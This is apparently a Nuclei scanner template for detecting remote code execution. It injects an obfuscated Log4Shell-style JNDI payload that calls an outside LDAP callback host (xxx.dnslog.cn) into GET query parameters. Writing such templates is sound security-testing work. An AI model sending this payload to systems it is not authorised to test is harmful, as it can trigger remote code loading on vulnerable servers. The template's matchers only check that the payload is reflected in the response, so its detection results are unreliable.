id: fuzz-rce-custom

info:
  name: Custom RCE Detection
  author: netbaan
  severity: high
  description: |
    This template is designed to detect Remote Code Execution (RCE) vulnerabilities using a specified payload.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Run only on GET requests

    payloads:
      rce:
        - "${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:Ä±}:}}}ldap://xxx.dnslog.cn}"

    stop-at-first-match: true

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{rce}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{rce}}"

      - type: word
        part: header
        words:
          - "text/html"